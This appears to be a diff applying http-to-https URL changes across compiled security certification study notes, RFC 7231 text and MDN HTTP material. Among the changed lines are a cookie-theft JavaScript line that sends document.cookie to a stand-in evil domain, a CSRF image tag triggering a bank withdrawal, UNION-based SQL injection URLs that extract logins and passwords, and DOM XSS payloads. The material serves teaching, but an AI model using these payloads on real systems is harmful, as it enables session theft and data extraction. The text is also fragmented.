+hash. If a virus infects a file on the web server, the hash of the infected file would be different from the hash of the original file (and the hash posted on the web site). You can use freeware such as md5sum.exe to calculate MD5 hashes. If you want to see this in action, check out the Creating and Comparing Hashes Lab in the online exercises for this book at https://gcgapremium.com/ 501labs/.
 I t ’s also possible to lose data integrity through human error. example, if a database administrator needs to modify a significant amount of data in a database, the administrator can write a script to perform a bulk update. However, if the script is faulty, it can corrupt the database, resulting in a loss of integrity.
 Two key concepts related to integrity are:
 Integrity provides assurances that data has not been modified, tampered with, or corrupted. Loss of integrity indicates the data is different. Unauthorized users can change data, or the changes can occur through system or human errors.
@@ -9467,7 +9467,7 @@ As a reminder, each virtual system or virtual machine is just one or more files.
 It’s worth pointing out that many VMs include the operating system and data, just as a physical system would have both the operating system and data on its physical drives. example, a virtual machine can include a database with credit card data, company financial records, or any type of proprietary data. Imagine if an administrator became disgruntled. He has access to the systems and as a malicious insider, he can copy the virtual machine, take it home, and launch it on another physical server. At this point, he has access to the system and the data.
 Running Kali Linux in a VM
 Kali Linux is a free Linux distribution used by many security professionals for penetration testing and security auditing. Additionally, CompTIA listed Kali as one of the recommended software tools. The good news is that you can download Kali Linux for free and install it as a VM using one of the available free virtualization tools.
-You can follow the online labs (http://gcgapremium.com/501labs/) to install Kali Linux within a VM. Note that you have some choices:
+You can follow the online labs (https://gcgapremium.com/501labs/) to install Kali Linux within a VM. Note that you have some choices:
 Hyper-V. If you’re running a version of Windows that supports Hyper-V, you can enable it on Windows and run VMs within it. One benefit of this is that in addition to creating a VM, you can also create a virtual switch.
 VMware Workstation Player. If your system doesn’t support Hyper-V, you can run the free version of VMware Workstation Player. A drawback is that the free version of VMware Workstation Player doesn’t support running multiple VMs within a single virtual environment. However, you can upgrade to the paid version of VMware Workstation Pro to gain this and multipleother features. Oracle VMVirtualBox. This has been my favorite in the past. However, when writing this chapter, Kali Linux wouldn’t successfully install in Oracle VM VirtualBox on my Windows system. This might be due to technical issues that Microsoft or Oracle will resolve with updates. Give it a try if you like. It might work perfectly for you.
 Once you have Kali Linux installed in a virtual environment, you’ll also be able to run some of the command-line tools mentioned in the CompTIA objectives that only run within Linux.
@@ -9476,7 +9476,7 @@ Command-line tools can be invaluable when troubleshooting or analyzing systems. 
  Some are specific to Windows systems and run through the Windows Command Prompt window. Others are specific to Linux systems
 and run through the Linux terminal (sometimes called the shell).
 As you read through this section and learn about these tools, I strongly encourage you to run the commands. You will also find some basic commands
-that you can run through in the online labs at http://gcgapremium.com/501labs/. A challenge many test takers have is that they don’t have a Linux system to play around with these commands. If you can’t enter them and see what they do, you might have trouble with even the easy questions. The online labs include labs you can use to create a virtual Linux environment on a Windows
+that you can run through in the online labs at https://gcgapremium.com/501labs/. A challenge many test takers have is that they don’t have a Linux system to play around with these commands. If you can’t enter them and see what they do, you might have trouble with even the easy questions. The online labs include labs you can use to create a virtual Linux environment on a Windows
 system.
 Windows Command Line
 Before you can use the command line in Windows, you first need to launch the Windows Command Prompt window. The simplest way to launch the Command Prompt window is to right- click the Start button and select Command Prompt, as shown in Figure 1.3. The Start button is at the lower left of your screen and clicking it displays the Start menu with links to many commonly used applications.
@@ -9552,7 +9552,7 @@ Maximum = 48ms, Average = 45ms
 Beware of Firewalls
 If you receive replies from a system, it verifies the other system is operational and reachable. However, if the ping command fails, it doesn’t necessarily mean that the remote system is operational or not reachable. Ping might show a “Reply Timed Out” error even if the remote system is functioning properly.
 Many denial-of-service (DoS) attacks use ICMP to disrupt services on Internet-based systems. To protect systems, firewalls commonly block ICMP traffic to prevent these attacks from succeeding. In other words, a remote system might be operational, but a ping will fail because the firewall is blocking ICMP traffic.
-example, you might be able to connect to the http:// blogs.getcertifiedgetahead.com web site using a web browser, but ping might fail. This indicates that the web site is operational with Hypertext Transfer Protocol (HTTP), but a firewall is blocking ICMP traffic.
+example, you might be able to connect to the https:// blogs.getcertifiedgetahead.com web site using a web browser, but ping might fail. This indicates that the web site is operational with Hypertext Transfer Protocol (HTTP), but a firewall is blocking ICMP traffic.
 Using Ping to Check Security Posture
 You can also use ping to check the security posture of a network. example, if you’ve configured firewalls and routers to block ping traffic, you can
    verify the firewalls and routers are blocking the traffic by using ping to check it.
@@ -11464,7 +11464,7 @@ Is restricted to a limited class of networks that are labeled as “centralized 
 Uses only four rating levels: None, C1 (Minimum), C2 (Fair), and B2 (Good)
 Green Book The Green Book, or the Department of Defense Password Management Guidelines, provides password creation and management guidelines; it’s important for those who configure and manage trusted systems.
 Table 8.2 has a more complete list of books in the rainbow series. For more information and to download the books, see the Rainbow Series web page here:
-http://csrc.nist.gov/publications/secpubs/index.html TA B L E 8 . 2 Important rainbow series elements
+https://csrc.nist.gov/publications/secpubs/index.html TA B L E 8 . 2 Important rainbow series elements
 Publication Number
 5200.28-STD
 CSC-STD-002-85 CSC-STD-003-85 NCSC-TG-001
@@ -11521,7 +11521,7 @@ Although the TCSEC concentrates almost exclusively on confidentiality, ITSEC add
 ITSEC does not rely on the notion of a TCB, and it doesn’t require that a system’s security components be isolated within a TCB.
 Unlike TCSEC, which required any changed systems to be reevaluated anew—be it for operating system upgrades, patches, or fixes; application upgrades or changes; and so forth—ITSEC includes coverage for maintaining targets of evaluation after such changes occur without requiring a new formal evaluation.
 For more information on ITSEC (now largely supplanted by the Common Criteria, covered in the next section), please view the overview document at
-296 Chapter 8 ■ Principles of Security Models, Design, and Capabilities https://www.bsi.bund.de/cae/servlet/contentblob/471346/publicationFile /30220/itsec-en_pdf.pdf Or you can view the original ITSEC specification here: http://www.ssi.gouv.fr/uploads/2015/01/ITSEC-uk.pdf
+296 Chapter 8 ■ Principles of Security Models, Design, and Capabilities https://www.bsi.bund.de/cae/servlet/contentblob/471346/publicationFile /30220/itsec-en_pdf.pdf Or you can view the original ITSEC specification here: https://www.ssi.gouv.fr/uploads/2015/01/ITSEC-uk.pdf
 Common Criteria
 More global effort
 Ultimately, it results in the ability to purchase CC-evaluated products (where CC, of course, stands for Common Criteria). The Common Criteria defines various levels of testing and confirmation of sys- tems’ security capabilities, and the number of the level indicates what kind of testing and confirmation has been performed. Nevertheless, it’s wise to observe that even the high- est CC ratings do not equate to a guarantee that such systems are completely secure or that they are entirely devoid of vulnerabilities or
@@ -11906,7 +11906,7 @@ Example:
 ##   - Lisa: Full Control
   - Bart: Read
   - Maggie: Modify
-online exercises: http://gcgapremium.com/501labs/.
+online exercises: https://gcgapremium.com/501labs/.
 The Owner Establishes Access
 If users create a file, they are designated as the owner and have explicit control over the file.
 As the owner, users can modify the permissions on the object by adding user or group accounts to the DACL and assigning the desired permissions.
@@ -13680,7 +13680,7 @@ live action:
 4. Predict the session token and take over the session. 5. Injectpacketstothetargetserver.
 NOTE Session hijacking can be done via brute force, calculation, or stealing. Additionally, you can always send a preconfigured session ID to the target; when the target clicks to open it, simply wait for authentication and jump in.
 TCP session hijacking is possible because of the way TCP works. As a session-oriented protocol, it provides unique numbers to each packet, which allows the receiving machine to reassemble them in the correct, original order, even if they are received out of order. The synchronized packets we’ve talked about throughout the book set up these sequence numbers (SNs). With more than 4 billion combinations available, the idea is to have the process begin as randomly as possible. However, it is statistically possible to repeat sequence numbers and, even easier, to guess what the next one in line will be.
-NOTE It is fair to note that sequence attacks are exceptionally rare in cases where you’re not in the middle. A definitive paper on the subject, despite its age, can be found at http://lcamtuf.coredump.cx/newtcp/. It provides images of sequence numbers from various operating system implementations and gives an idea of how statistically successful (or unsuccessful) you’ll be in messing with them.
+NOTE It is fair to note that sequence attacks are exceptionally rare in cases where you’re not in the middle. A definitive paper on the subject, despite its age, can be found at https://lcamtuf.coredump.cx/newtcp/. It provides images of sequence numbers from various operating system implementations and gives an idea of how statistically successful (or unsuccessful) you’ll be in messing with them.
 So, just for clarity’s sake, let’s go back to the earlier discussion on TCP packets flying through the ether. The initial sequence number (ISN) is sent by the initiator of the session in the first step (SYN). This is acknowledged in the second handshake (SYN/ACK) by incrementing that ISN by one, and another ISN is generated by the recipient. This second number is acknowledged by the initiator in the third step (ACK), and from there on out communication can occur. The window size field will tell the recipient how much he can send before expecting a return acknowledgment. Combine all of them together and, over time, you can watch the whole thing in action. For example, consider Figure 9-5. It’s worth mentioning these types of attacks are considered very rare in the real world: outside of a very rare MITM attack, you’re as likely to see this (and Ping of Death) as you are to see a flying peacock.
      Figure 9-5 TCP communication
 NOTE There are also windowing attacks for TCP that shrink the data size window.
@@ -13689,7 +13689,7 @@ After the handshake, for every data payload transmitted, the sequence number is 
 It seems easy enough, but once you add the window size and take into account that the numbers aren’t simple (like the 100 and 500 in our example), it can get hairy pretty quickly. The window size, you may recall, tells the sender how many outstanding bytes it can have on the network without expecting a response. The idea is to improve performance by allowing more than one byte at a time before requiring the “Hey, I got it” acknowledgment. This sometimes complicates things because the sender may cut back within the window size based on what’s going on network-wise and what it’s trying to send.
 EXAM TIP You’ll need to remember that the sequence numbers increment on acknowledgment. Additionally, you’ll almost certainly get asked a scenario version of sequence numbering (if I were writing the test, I’d give you one). You’ll need to know, given an acknowledgment number and a window size, what sequence number would be acceptable to the system. For example, an acknowledgment of 105 with a window size of 200 means you could expect sequence numbering from 105 through 305.
 Thankfully, a multitude of tools are available to assist in session hijacking. We’ve mentioned Ettercap before—a packet sniffer on steroids—but not in the context of actively hijacking sessions. It’s an excellent man-in-the-middle tool and can be run from a variety of platforms (although it is Linux native). Hunt and T-sight are probably the two best-known session hijacking tools. Hunt can sniff, hijack, and reset connections at will, whereas T-sight (commercially available) can easily hijack sessions as well as monitor additional network connections. Other tools include, but are not limited to, Zaproxy and Paros (both known more as a proxy), Burp Suite, Juggernaut (a well-known Linux- based tool), Hamster, and Ferret.
-NOTE You’ve heard of session hijacking and man-in-the-middle, but what about man-in-the-browser? An MIB attack occurs when the hacker sends a Trojan to intercept browser calls. The Trojan basically sits between the browser and libraries, allowing a hacker to watch, and interact within, a browser session. Cobalt Strike creator Peiter C. Zatko (a.k.a. Mudge) added this feature a couple years back (http:// www.advancedpentest.com/help-browser-pivoting). If you have his Beacon (the name of his implant) on a box, you can “browser pivot” such that all of the target’s active sessions become your own. All of them. It effectively sets up a local proxy port so you can point your browser to it, and it directs all of your requests through the beacon on the target machine. Now you’re browsing in your own browser as them, without them even knowingit.
+NOTE You’ve heard of session hijacking and man-in-the-middle, but what about man-in-the-browser? An MIB attack occurs when the hacker sends a Trojan to intercept browser calls. The Trojan basically sits between the browser and libraries, allowing a hacker to watch, and interact within, a browser session. Cobalt Strike creator Peiter C. Zatko (a.k.a. Mudge) added this feature a couple years back (https:// www.advancedpentest.com/help-browser-pivoting). If you have his Beacon (the name of his implant) on a box, you can “browser pivot” such that all of the target’s active sessions become your own. All of them. It effectively sets up a local proxy port so you can point your browser to it, and it directs all of your requests through the beacon on the target machine. Now you’re browsing in your own browser as them, without them even knowingit.
 Countermeasures for session hijacking are, again, usually commonsense issues. For one thing, using unpredictable session IDs in the first place protects against hijacking (remember this one). Other options include limiting incoming connections, minimizing remote access, and regenerating the session key after authentication is complete. Lastly, a really good choice is to use encryption to protect the channel. We’ll cover IPSec more when we get around to cryptography, but a small refresher here (or introduction, if you know nothing about it) is a great idea—mainly because this is where ECC covers it and its encryption and authentication is considered good prevention against session hijacking.
 IPSec is used to secure IP communication by providing encryption and authentication services to each packet, and it has several architectural components you’ll need to know. First, IPSec works in two modes. In transport mode, the payload and ESP trailer are encrypted; however, the IP header of the original packet is not. Transport can be used in network address translation (NAT) because the original packet is still routed in exactly the same manner as it would have been without IPSec. Tunnel mode, however, encrypts the whole thing, encapsulating the entire original packet in a new IPSec shell. This makes it incompatible with NAT. The rest of IPSec architecture includes the following protocols:
 - AuthenticationHeaderAHisaprotocolwithinIPSecthatguaranteestheinte grityandauthenticationoftheIPpacket sender.
@@ -14759,7 +14759,7 @@ Later, a user authenticates with a username and password.
 The system then calculates the hash of the password that the user entered, and compares the calculated hash against the stored hash.
 If they match, it indicates the user entered the correct password.
 tools are available to discover many hashed passwords. Example
-  - MD5 Online (http://www.md5online.org/)
+  - MD5 Online (https://www.md5online.org/)
   - allows you to enter a hash and it gives you the text of the password.
   - MD5 Online uses a database of hashed words from a dictionary.
   - If the hash matches a database entry, the site returns the password.
@@ -15144,7 +15144,7 @@ like OPTIONS or HEAD
 - The path of the resource to fetch; the URL of the resource stripped from elements that are obvious from the context
         - the protocol (   ), the domain (
 ), the TCP port (80).
-http://
+https://
  developer.mozilla.org
 - The version of the HTTP protocol.
 - Optional headers: convey additional information for the
@@ -15177,11 +15177,11 @@ level protocol for distributed, collaborative, hypertext information systems. Th
 Status of This Memo
 This is an Internet Standards Track document.
 This document is a product of the Internet Engineering Task Force (IETF). It represents the consensus of the IETF community. It has received public review and has been approved for publication by the Internet Engineering Steering Group (IESG). Further information on Internet Standards is available in Section 2 of RFC 5741.
-Information about the current status of this document, any errata, and how to provide feedback on it may be obtained at http://www.rfc-editor.org/info/rfc7231.
+Information about the current status of this document, any errata, and how to provide feedback on it may be obtained at https://www.rfc-editor.org/info/rfc7231.
    Fielding & Reschke Standards Track [Page 1]
 RFC 7231 HTTP/1.1 Semantics and Content June 2014 Copyright Notice
 Copyright (c) 2014 IETF Trust and the persons identified as the document authors. All rights reserved.
-This document is subject to BCP 78 and the IETF Trust's Legal Provisions Relating to IETF Documents (http://trustee.ietf.org/license-info) in effect on the date of
+This document is subject to BCP 78 and the IETF Trust's Legal Provisions Relating to IETF Documents (https://trustee.ietf.org/license-info) in effect on the date of
 publication of this document. Please review these documents
 carefully, as they describe your rights and restrictions with respect
 to this document. Code Components extracted from this document must include Simplified BSD License text as described in Section 4.e of
@@ -15313,7 +15313,7 @@ Note: Unlike some similar constructs in other header fields, media type paramete
  3.1.1.2. Charset
 HTTP uses charset names to indicate or negotiate the character encoding scheme of a textual representation [RFC6365]. A charset is identified by a case-insensitive token.
 charset = token
-Charset names ought to be registered in the IANA "Character Sets" registry (<http://www.iana.org/assignments/character-sets>) according to the procedures defined in [RFC2978].
+Charset names ought to be registered in the IANA "Character Sets" registry (<https://www.iana.org/assignments/character-sets>) according to the procedures defined in [RFC2978].
 3.1.1.3. Canonicalization and Text Defaults
 Internet media types are registered with a canonical form in order to
 be interoperable among systems with varying native encoding formats. Representations selected or transferred via HTTP ought to be in canonical form, for many of the same reasons described by the Multipurpose Internet Mail Extensions (MIME) [RFC2045]. However, the performance characteristics of email deployments (i.e., store and forward messages to peers) are significantly different from those common to HTTP and the Web (server-based information services). Furthermore, MIME's constraints for the sake of compatibility with
@@ -16054,7 +16054,7 @@ To find out which request methods a server supports, one can use   and issue an 
 The response then contains an methods:
 header with the allowed
 OPTIONS
- curl -X OPTIONS http://example.org -i
+ curl -X OPTIONS https://example.org -i
  Allow
  HTTP/1.1 204 No Content
 Allow: OPTIONS, GET, HEAD, POST
@@ -16078,7 +16078,7 @@ Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Connection: keep-alive
-Origin: http://foo.example
+Origin: https://foo.example
 Access-Control-Request-Method: POST
 Access-Control-Request-Headers: X-PINGOTHER,
 Content-Type
@@ -16090,7 +16090,7 @@ OPTIONS
   HTTP/1.1 204 No Content
 Date: Mon, 01 Dec 2008 01:15:39 GMT
 Server: Apache/2.0.61 (Unix)
-Access-Control-Allow-Origin: http://foo.example ▪
+Access-Control-Allow-Origin: https://foo.example ▪
 
 
 ##  Access-Control-Allow-Methods: POST, GET, OPTIONS
@@ -16572,7 +16572,7 @@ maintenance. Some servers use the Referer header field as a means of
 denying links from other sites (so-called "deep linking") or
 restricting cross-site request forgery (CSRF), but not all requests
 contain it. Example:
-Referer: http://www.example.org/hypertext/Overview.html
+Referer: https://www.example.org/hypertext/Overview.html
 If the target URI was obtained from a source that does not have its
 own URI (e.g., input from the user keyboard, or an entry within the
 user's bookmarks/favorites), the user agent MUST either exclude the
@@ -17102,15 +17102,15 @@ Location = URI-reference
 The field value consists of a single URI-reference. When it has the form of a relative reference ([RFC3986], Section 4.2), the final value is computed by resolving it against the effective request URI ([RFC3986], Section 5).
 For 201 (Created) responses, the Location value refers to the primary resource created by the request. For 3xx (Redirection) responses, the Location value refers to the preferred target resource for automatically redirecting the request.
 If the Location value provided in a 3xx (Redirection) response does not have a fragment component, a user agent MUST process the redirection as if the value inherits the fragment component of the URI reference used to generate the request target (i.e., the redirection inherits the original reference's fragment, if any).
-For example, a GET request generated for the URI reference "http://www.example.org/~tim" might result in a 303 (See Other) response containing the header field:
+For example, a GET request generated for the URI reference "https://www.example.org/~tim" might result in a 303 (See Other) response containing the header field:
 Location: /People.html#tim
-which suggests that the user agent redirect to "http://www.example.org/People.html#tim"
+which suggests that the user agent redirect to "https://www.example.org/People.html#tim"
    Fielding & Reschke Standards Track [Page 68]
 RFC 7231 HTTP/1.1 Semantics and Content
 June 2014
- Likewise, a GET request generated for the URI reference "http://www.example.org/index.html#larry" might result in a 301 (Moved Permanently) response containing the header field:
-Location: http://www.example.net/index.html
-which suggests that the user agent redirect to "http://www.example.net/index.html#larry", preserving the original fragment identifier.
+ Likewise, a GET request generated for the URI reference "https://www.example.org/index.html#larry" might result in a 301 (Moved Permanently) response containing the header field:
+Location: https://www.example.net/index.html
+which suggests that the user agent redirect to "https://www.example.net/index.html#larry", preserving the original fragment identifier.
 There are circumstances in which a fragment identifier in a Location value would not be appropriate. For example, the Location header field in a 201 (Created) response is supposed to provide a URI that is specific to the created resource.
 Note: Some recipients attempt to recover from Location fields that are not valid URI references. This specification does not mandate or define such processing, but does allow it for the sake of robustness.
 Note: The Content-Location header field (Section 3.1.4.2) differs from Location in that the Content-Location refers to the most specific resource corresponding to the enclosed representation. It is therefore possible for a response to contain both the Location and Content-Location header fields.
@@ -17186,7 +17186,7 @@ Example:
 Server: CERN/3.0 libwww/2.17
 An origin server SHOULD NOT generate a Server field containing needlessly fine-grained detail and SHOULD limit the addition of subproducts by third parties. Overly long and detailed Server field values increase response latency and potentially reveal internal implementation details that might make it (slightly) easier for attackers to find and exploit known security holes.
 8. IANA Considerations 8.1. Method Registry
-The "Hypertext Transfer Protocol (HTTP) Method Registry" defines the namespace for the request method token (Section 4). The method registry has been created and is now maintained at <http://www.iana.org/assignments/http-methods>.
+The "Hypertext Transfer Protocol (HTTP) Method Registry" defines the namespace for the request method token (Section 4). The method registry has been created and is now maintained at <https://www.iana.org/assignments/http-methods>.
        Fielding & Reschke Standards Track [Page 73]
 RFC 7231 HTTP/1.1 Semantics and Content June 2014
 8.1.1. Procedure
@@ -17221,7 +17221,7 @@ RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.1.3. Registrations
 | Section 4.3.4 |
 | Section 4.3.8 |
   8.2. Status Code Registry
-The "Hypertext Transfer Protocol (HTTP) Status Code Registry" defines the namespace for the response status-code token (Section 6). The status code registry is maintained at <http://www.iana.org/assignments/http-status-codes>.
+The "Hypertext Transfer Protocol (HTTP) Status Code Registry" defines the namespace for the response status-code token (Section 6). The status code registry is maintained at <https://www.iana.org/assignments/http-status-codes>.
 This section replaces the registration procedure for HTTP Status Codes previously defined in Section 7.1 of [RFC2817].
 8.2.1. Procedure
 A registration MUST include the following fields: o Status Code (3 digits)
@@ -17302,7 +17302,7 @@ June 2014
 | 504
 | 505 +-------+-------------------------------+----------------+
 8.3. Header Field Registry
-HTTP header fields are registered within the "Message Headers" registry located at <http://www.iana.org/assignments/message-headers>, as defined by [BCP90].
+HTTP header fields are registered within the "Message Headers" registry located at <https://www.iana.org/assignments/message-headers>, as defined by [BCP90].
 Fielding & Reschke Standards Track [Page 77]
 RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.3.1. Considerations for New Header Fields
 Header fields are key:value pairs that can be used to communicate data about the message, its payload, the target resource, or the connection (i.e., control data). See Section 3.2 of [RFC7230] for a general definition of header field syntax in HTTP messages.
@@ -17327,7 +17327,7 @@ Leading and trailing whitespace in raw field values is removed upon field parsin
 Because commas (",") are used as a generic delimiter between field-values, they need to be treated with care if they are allowed
 in the field-value. Typically, components that might contain a comma are protected with double-quotes using the quoted-string ABNF production.
 For example, a textual date and a URI (either of which might contain a comma) could be safely carried in field-values like these:
-Example-URI-Field: "http://example.com/a.html,foo", "http://without-a-comma.example.com/"
+Example-URI-Field: "https://example.com/a.html,foo", "https://without-a-comma.example.com/"
          Example-Date-Field: "Sat, 04 May 1996", "Wed, 14 Sep 2005"
 Note that double-quote delimiters almost always are used with the quoted-string production; using a different syntax inside double-quotes will likely cause unnecessary confusion.
 Fielding & Reschke Standards Track [Page 78]
@@ -17392,7 +17392,7 @@ The change controller for the above registrations is: "IETF (iesg@ietf.org) - In
 Fielding & Reschke Standards Track [Page 80]
 RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.4. Content Coding Registry
 The "HTTP Content Coding Registry" defines the namespace for content coding names (Section 4.2 of [RFC7230]). The content coding registry
-is maintained at <http://www.iana.org/assignments/http-parameters>.
+is maintained at <https://www.iana.org/assignments/http-parameters>.
 8.4.1. Procedure
 Content coding registrations MUST include the following fields:
 | http
@@ -17517,7 +17517,7 @@ RFC 7231 HTTP/1.1 Semantics and Content June 2014
 [OWASP] van der Stock, A., Ed., "A Guide to Building Secure Web Applications and Web Services", The Open Web Application Security Project (OWASP) 2.0.1, July 2005, <https://www.owasp.org/>.
         [REST]
 Fielding, R., "Architectural Styles and the Design of Network-based Software Architectures",
-Doctoral Dissertation, University of California, Irvine, September 2000, <http://roy.gbiv.com/pubs/dissertation/top.htm>.
+Doctoral Dissertation, University of California, Irvine, September 2000, <https://roy.gbiv.com/pubs/dissertation/top.htm>.
     [RFC1945] Berners-Lee, T., Fielding, R., and H. Nielsen, "Hypertext Transfer Protocol -- HTTP/1.0", RFC 1945, May 1996.
  [RFC2049] Freed, N. and N. Borenstein, "Multipurpose Internet Mail Extensions (MIME) Part Five: Conformance Criteria and Examples", RFC 2049, November 1996.
 [RFC2068] Fielding, R., Gettys, J., Mogul, J., Nielsen, H., and T. Berners-Lee, "Hypertext Transfer Protocol -- HTTP/1.1", RFC 2068, January 1997.
@@ -17826,12 +17826,12 @@ Authors' Addresses
 Roy T. Fielding (editor) Adobe Systems Incorporated 345 Park Ave
 San Jose, CA 95110
 USA
-EMail: fielding@gbiv.com URI: http://roy.gbiv.com/
+EMail: fielding@gbiv.com URI: https://roy.gbiv.com/
 [Page 100]
 June 2014
    Julian F. Reschke (editor) greenbytes GmbH Hafenweg 16
 Muenster, NW 48155 Germany
-EMail: julian.reschke@greenbytes.de URI: http://greenbytes.de/tech/webdav/
+EMail: julian.reschke@greenbytes.de URI: https://greenbytes.de/tech/webdav/
   Fielding & Reschke Standards Track [Page 101] Html markup produced by rfcmarkup 1.129d, available from https://tools.ietf.org/tools/rfcmarkup/
 Different kinds of caches
 The performance of web sites and applications can be 1,586
@@ -18281,8 +18281,8 @@ Common ways to steal cookies:
 当网站允许使用javascript操作cookie的时候，就会发生攻击者发 布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。
 当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果 这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻 击者同样可以拿cookie搞事情。
 解决办法: 通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代
-     (new Image()).src = "http://www.evil-domain.example.com/steal- cookie?cookie=" + document.cookie;
- <a href="#" onclick=`window.location=http:// abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
+     (new Image()).src = "https://www.evil-domain.example.com/steal- cookie?cookie=" + document.cookie;
+ <a href="#" onclick=`window.location=https:// abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
  ▪
 
 
@@ -18316,7 +18316,7 @@ to prevent this:
 - 增加其他信息的校验(手机验证码，或者其他盾牌)。 - GET endpoints should be idempotent
 ◦ actions that enact a change and do not simply retrieve
 data should require sending a POST (or other HTTP method) request.
-  <img  src = "http://www.bank.com/withdraw?
+  <img  src = "https://www.bank.com/withdraw?
 user=SanShao&amount=999999&for=XiaoMing" >
  ◦ POST endpoints should not interchangeably accept GET requests with parameters in the query string.
 - A CSRF token should be included in <form> elements via a hidden input field.
@@ -18496,7 +18496,7 @@ HTTP request methods include GET, HEAD, POST, PUT, TRACE, and CONNECT
   - The problem: used HTTP GET to send data, when sending data, the GET method adds the data to the URL.
   - Example
   - a GET was used in answering a bill for a credit card.
-  - the URL display like this: http://www.example.com/checkout?
+  - the URL display like this: https://www.example.com/checkout?
 7568.asp/credit1234567890123456 (the underlined section
 showing the ridiculousness of using GET in this way).
   - GET请求会向数据库发索取数据的请求，从而来获取信息，该请
@@ -19012,7 +19012,7 @@ else throw new Error("no support"); }
 <option value="blue">blue</option>
 <option value="green">green</option> </select>
 <small>
-<a href="http://some.website.tld/page.html" id="sample">
+<a href="https://some.website.tld/page.html" id="sample">
 (sample link)
 </a> </small><br />
 <input type="button" value="version" onclick="ver()" /> </form>
@@ -20209,7 +20209,7 @@ some web organizations - IEFT
   - An RFC is used to set all sorts of standards, from the makeup of a UDP header to how routing protocols are supposed to work, and almost anything else you can think of.
   - Per the IETF regarding RFCs: “...this name (used since 1969, before the IETF existed) expresses something important: the Internet is a constantly changing technical system, and any document that we write today may need to be updated tomorrow.”
   - When you think IETF, think engineering, and engineering only—they’re not here to police what the engineered solution is used for, just to provide the work to get the thing running.
-  - “We try to avoid policy and business questions, as much as possible, to concentrate solely on the engineering side of the house.” They recommend http://www.internetsociety.org/ as a place to go worry about policy.
+  - “We try to avoid policy and business questions, as much as possible, to concentrate solely on the engineering side of the house.” They recommend https://www.internetsociety.org/ as a place to go worry about policy.
 - World Wide Web Consortium (W3C).   - an international community   - “member organizations, a full-time staff, and the public work together to develop Web standards.” “to lead the World Wide Web to its full potential by developing protocols and guidelines that ensure the long- term growth of the Web.”
   - For example, when incompatible versions of HTML are offered by different vendors, causing inconsistency in how web pages are displayed, the consortium tries to get all those vendors to implement a set of core principles and components that are chosen by the consortium.
   - W3C engages in education and outreach, develops software, and serves as an open forum for discussion about the Web.
@@ -21515,9 +21515,9 @@ database.
   - /index.asp, line 6
   - the error message provides the information:
 Then, by using the following statement,
-  - http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') - -
+  - https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') - -
 If you use the LIKE keyword in the following statement, additional information can be found:
-  - http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE ' % 25 login % 25 ’ --
+  - https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE ' % 25 login % 25 ’ --
   - The term '%25login%25’: will be interpreted as %login% by the server.
    - the string could not be converted to an integer
   - provides the name of the first table in the database, namely employeetable.
@@ -21531,7 +21531,7 @@ If you use the LIKE keyword in the following statement, additional information c
   - /index.asp, line 6
   - The ODBC error message
 The next step, obtain a login name from the sys_login table:
-  - http://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login - -
+  - https://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login - -
   - The resulting ODBC error message:
   - Microsoft OLE DB Provider for ODBC Drivers error
 '80040e07'
@@ -21544,7 +21544,7 @@ provides the login name whiteknight from the sys_login
 
 
 ##  To obtain the password for whiteknight:
-  - http://page/index.asp?id=20 UNION SELECT TOP 1
+  - https://page/index.asp?id=20 UNION SELECT TOP 1
 password FROM sys_login where login_name='whiteknight' - -
   - The corresponding ODBC error message is:
   - Microsoft OLE DB Provider for ODBC Drivers error ‘80040907'
@@ -21557,7 +21557,7 @@ Examples:
 acquire column names by accessing the database
 table, INFORMATION_SCHEMA.COLUMNS.
 The injection attack begins with the URL:
-  - http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
+  - https://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
    ▪
 
 
@@ -22083,7 +22083,7 @@ at some point after the page has loaded - Suppose the following code is used to 
 document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.index Of("default=")+8)+"</OPTION>");
 document.write("<OPTION value=2>English</OPTION>"); </script></select>
 The page is invoked with a URL such as:
-http://www.some.site/page.html?default=French
+https://www.some.site/page.html?default=French
 A DOM Based XSS attack against this page can be accomplished by
 sending the following URL to a victim:
 When the victim clicks on this link, the browser sends a request to www.some.site. /page.html?default=<script>alert(document.cookie)</script>
@@ -22091,8 +22091,8 @@ The server responds with the page containing the above Javascript code. The brow
 The original Javascript code in the page does not expect the default parameter to contain HTML markup, and as such it simply echoes it into the page (DOM) at runtime. The browser then renders the resulting page and executes the attacker’s script:
 alert(document.cookie)
 Note that the HTTP response sent from the server does not contain the
-  http://www.some.site/page.html? default=<script>alert(document.cookie)</script>
-  http://www.some.site/page.html? default=<script>alert(document.cookie)</script>
+  https://www.some.site/page.html? default=<script>alert(document.cookie)</script>
+  https://www.some.site/page.html? default=<script>alert(document.cookie)</script>
  attacker’s payload. This payload manifests itself at the client-side script at runtime, when a flawed script accesses the DOM variable document.location and assumes it is not malicious.
   1. The attacker crafts a URL containing a malicious string and sends it
 to the victim.
@@ -22135,7 +22135,7 @@ XSS Using Code Encoding
 - encode script in base64 and place it in META tag.
 - This way get rid of   totally.
 what XSS is and what you can do with it Recognize URL indicator of an XSS attempt:
-http://IPADDRESS/′′;!- -′′<XSS>=&{()}.
+https://IPADDRESS/′′;!- -′′<XSS>=&{()}.
